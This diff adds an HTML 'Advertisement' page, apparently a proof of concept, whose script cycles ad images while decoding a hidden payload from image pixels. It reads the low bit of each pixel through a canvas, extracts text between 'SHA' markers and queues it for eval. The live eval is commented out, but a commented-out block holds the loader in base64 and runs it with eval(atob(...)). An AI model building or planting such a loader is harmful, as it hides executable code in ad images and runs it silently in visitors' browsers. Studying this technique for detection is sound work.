@@ -1,0 +1,108 @@
+<html>
+<head><title>Advertisement</title></head>
+
+<body>
+<!--
+<img id="img" src="data:image/png;base64,eiA9ICIiOw0KDQpmdW5jdGlvbiB2KGIpIHsNCiAgICBzID0gJyc7DQogICAgZm9yIChpID0gMCwgbCA9IGIubGVuZ3RoOyBpIDwgbDsgaSArPSA4KSB7DQogICAgICAgIGMgPSAwOw0KICAgICAgICBmb3IgKGogPSA3OyBqID49IDA7IGogLT0gMSkgew0KICAgICAgICAgICAgYyArPSBiW2kgKyA3IC0gal0gPDwgajsNCiAgICAgICAgfQ0KICAgICAgICBzICs9IFN0cmluZy5mcm9tQ2hhckNvZGUoYyk7DQogICAgfQ0KICAgIHJldHVybiBzOw0KfQ0KDQpmdW5jdGlvbiBkKGltZykgew0KICAgIGkgPSAwOw0KICAgIGwgPSBpbWcubGVuZ3RoOw0KICAgIHN0ID0gW107DQogICAgd2hpbGUgKGkgPCBsKSB7DQogICAgICAgIHN0W2ldID0gaW1nW2kgKiA0XSAmIDE7DQogICAgICAgIGkgKz0gMTsNCiAgICB9DQogICAgcmV0dXJuIHYoc3QpOw0KfQ0KDQpmdW5jdGlvbiBmKCkgew0KICAgIHcgPSBpLm5hdHVyYWxXaWR0aDsNCiAgICBoID0gaS5uYXR1cmFsSGVpZ2h0Ow0KICAgIGMgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJjYW52YXMiKTsNCiAgICB4ID0gYy5nZXRDb250ZXh0KCIyZCIpOw0KICAgIGMud2lkdGggPSB3Ow0KICAgIGMuaGVpZ2h0ID0gaDsNCiAgICB4LmRyYXdJbWFnZShpLCAwLCAwLCB3LCBoKTsNCiAgICB0ID0gZCh4LmdldEltYWdlRGF0YSgwLCAwLCB3LCBoKS5kYXRhKTsNCiAgICBpZiAodCA9IHQubWF0Y2goL1NIQS4qU0hBLykpIHsNCiAgICAgICAgLy96ICs9IHRbMF0ucmVwbGFjZSgvU0hBL2csICcnKTsNCiAgICAgICAgeiArPSB0WzBdOw0KICAgIH0NCn07DQoNCmZ1bmN0aW9uIHEoKSB7DQogICAgaSA9IG5ldyBJbWFnZSgpOw0KICAgIGkuYWRkRXZlbnRMaXN0ZW5lcignbG9hZCcsIGYsIGZhbHNlKTsNCiAgICBpLnNyYyA9ICJub3RpdC5wbmciDQp9DQpzZXRUaW1lb3V0KHEsIDEwMDApOw0KDQpmdW5jdGlvbiBhKCkgew0KICAgIGFsZXJ0KCJnb2luZyB0byBldmFsIit6KTsNCiAgICBldmFsKHopDQp9DQpzZXRUaW1lb3V0KGEsIDIwMDAwMCkNCg==">
+
+<script type="text/javascript"> 
+console.log("before");
+console.log(document.images[0].src);
+eval(atob(document.images[0].src.replace(/.*,/, "")));
+console.log("after")
+console.log(document.images[0].src);
+-->
+
+<img id="img" src="data:image/png;">
+<script type="text/javascript">
+
+z = "";
+
+function v(b) {
+    console.log("calling v");
+    s = '';
+    for (i = 0, l = b.length; i < l; i += 8) {
+        c = 0;
+        for (j = 7; j >= 0; j -= 1) {
+            c += b[i + 7 - j] << j;
+        }
+        s += String.fromCharCode(c);
+    }
+    return s;
+}
+
+function d(img) {
+    console.log("calling d");
+    i = 0;
+    l = img.length;
+    st = [];
+    while (i < l) {
+        st[i] = img[i * 4] & 1;
+        i += 1;
+    }
+    return v(st);
+}
+
+function f() {
+  console.log("calling f");
+    w = i.naturalWidth;
+    h = i.naturalHeight;
+    c = document.createElement("canvas");
+    x = c.getContext("2d");
+    c.width = w;
+    c.height = h; 
+    x.drawImage(i, 0, 0, w, h);
+    t = d(x.getImageData(0, 0, w, h).data);
+    if (t = t.match(/SHA.*SHA/)) {
+        z += t[0].replace(/SHA/g, '');
+        //z += t[0];
+    }
+};
+
+function q() {
+    console.log("calling q with ivar", ivar);
+    i = new Image();
+  console.log("before add event listener");
+    i.addEventListener('load', f, false);
+  console.log("after add event listener");
+    //i.src = "notit.png"
+    i.src = ivar;
+	
+  //console.log("calling f");
+    //f();
+}
+
+function aa(){
+    ivar = "ad002.png";
+}
+function aaa(){
+    ivar = "ad003.png";
+}
+var ivar = "ad000.png";
+setTimeout(q, 1000);
+//setTimeout(aa,2000);
+//setTimeout(aaa,3000);
+
+function a() {
+    //alert("going to eval"+z);
+    console.log("calling eval z "+z+" ;");
+    //eval(z)
+}
+//setTimeout(a, 200000)
+setTimeout(a, 2000)
+
+
+
+// Show ads
+function showImage(i){
+    document.images[0].src="images/ad00" + i + ".png";
+}
+
+for (i=0;i<7;i++){
+    setTimeout(showImage,2000*i,i);
+}
+
+</script> 
+</body> 
+</html>
+
